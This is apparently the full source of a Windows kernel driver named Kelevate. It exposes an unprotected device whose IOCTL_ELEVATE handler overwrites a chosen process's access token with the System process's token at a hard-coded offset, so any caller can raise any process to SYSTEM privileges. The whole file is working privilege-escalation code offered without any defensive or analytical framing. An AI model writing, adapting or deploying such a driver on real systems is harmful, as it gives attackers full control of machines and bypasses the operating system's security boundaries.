#include <ntifs.h>
#include <ntddk.h>
#include "kelevate.h"

void KelevateUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS KelevateCreateClose(PDEVICE_OBJECT, PIRP Irp);
NTSTATUS KelevateDeviceControl(PDEVICE_OBJECT, PIRP Irp);

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
	DriverObject->DriverUnload = KelevateUnload;

	DriverObject->MajorFunction[IRP_MJ_CREATE] = KelevateCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = KelevateCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KelevateDeviceControl;

	PDEVICE_OBJECT DeviceObject;
	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\Kelevate");
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName,	FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		return status;
	}
		
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Kelevate");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		IoDeleteDevice(DeviceObject);
		return status;
	}
	return STATUS_SUCCESS;
}


void KelevateUnload(PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Kelevate");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS KelevateCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS KelevateDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_INVALID_DEVICE_REQUEST;
	auto& dic = stack->Parameters.DeviceIoControl;

	switch (dic.IoControlCode) {
	case IOCTL_ELEVATE:
		if (dic.InputBufferLength < sizeof(ProcessData)) {
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}
		auto data = (ProcessData*)Irp->AssociatedIrp.SystemBuffer;
		if (data == nullptr) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		if (data->ProcessId < 1) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		// Process logic
		PEPROCESS eprocSystem = NULL;
		status = PsLookupProcessByProcessId(UlongToHandle(4), &eprocSystem);
		if (!NT_SUCCESS(status)) {
			status = STATUS_INTERNAL_ERROR;
			break;
		}
		PEPROCESS eprocUser = NULL;
		status = PsLookupProcessByProcessId(UlongToHandle(data->ProcessId), &eprocUser);
		if (!NT_SUCCESS(status)) {
			status = STATUS_INTERNAL_ERROR;
			break;
		}

		*(QWORD*) ((QWORD)eprocUser + TOKEN_OFFSET) = *(QWORD*)((QWORD)eprocSystem + TOKEN_OFFSET);
		KdPrint(("Elevated Process %d\n", data->ProcessId));
		break;
	}

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

